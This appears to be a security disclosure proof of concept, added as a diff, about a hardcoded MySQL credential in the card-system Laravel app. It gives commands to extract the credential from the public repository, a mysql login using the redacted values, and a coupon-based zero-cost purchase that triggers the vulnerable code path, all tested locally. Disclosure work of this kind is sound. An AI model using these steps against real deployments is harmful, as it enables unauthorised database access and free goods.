@@ -1,0 +1,48 @@
+CARD-01 PoC — Hardcoded third-party MySQL credential in Product::createApiCards
+================================================================================
+Target: Tai7sy/card-system @ 4e908dd55f50f1cb6d70eba0d34efb1ec7d74ea3 (Laravel 5.5)
+File:   app/Product.php (single-line source), function createApiCards()
+
+[1] Extract the hardcoded credential from the public source:
+
+    git clone https://github.com/Tai7sy/card-system.git
+    git -C card-system checkout 4e908dd55f50f1cb6d70eba0d34efb1ec7d74ea3
+    grep -o "mysqli_connect([^)]*)" card-system/app/Product.php
+
+    -> mysqli_connect('localhost', '<REDACTED>', '<REDACTED>', '<REDACTED>', '3306')
+    -> followed by: INSERT INTO `<REDACTED>`.`ac_kms` (...) built by string
+       concatenation (join(',', $rows))
+
+[2] Runtime proof (LOCAL, isolated instance; a local MySQL 8.0.39 was
+    provisioned with the exact hardcoded pair - no external system contacted):
+
+    # a) credential validity, independent of the app:
+    mysql -h 127.0.0.1 -P 3306 -u <REDACTED> -p'<REDACTED>' <REDACTED>   # auth OK
+
+    # b) drive the real shipped code path end-to-end:
+    #    POST /api/shop/buy  product_id=<API-delivery product (delivery=2)>
+    #    with a coupon whose discount_val == product price -> paid=0
+    #    -> Shop\Pay::buy() -> shipOrder() -> delivery===DELIVERY_API
+    #    -> Product::createApiCards($order)
+    #
+    #    Run #1 (MySQL 8 default sql_mode): app log shows connect/auth with the
+    #    hardcoded credential SUCCEEDED and the INSERT was issued; it failed only
+    #    on the zero-date sql_mode rule (occurs AFTER successful connect/auth):
+    #      local.ERROR: App.Products, connect udid database failed
+    #      {"sql":"INSERT INTO `<REDACTED>`.`ac_kms` (...) VALUES (NULL,
+    #       'THHD...', ...)","error":"Incorrect datetime value:
+    #       '0000-00-00 00:00:00' for column 'tjtime' at row 1"}
+    #
+    #    Run #2 (zero-date relaxed on the local test server): full success -
+    #    row written through the hardcoded credential AND the same generated
+    #    card code delivered to the buyer as a sold card:
+    #      <REDACTED>.ac_kms: id=1 km=TRXU6ARFHFCMUBL3
+    #      orders: paid=0 status=2 (SUCCESS); cards: card=TRXU6ARFHFCMUBL3
+
+Conclusion: the credential pair shipped in the public repo is live and
+functional - the code authenticates to a MySQL server with it at runtime for
+every API-delivery product order. Using it against the VENDOR'S own database
+additionally requires network reachability to the vendor's MySQL host (the
+code configures 'localhost'), which limits direct remote exploitation but does
+not change the disclosure: a valid third-party DB password (prone to reuse) is
+public in the source.
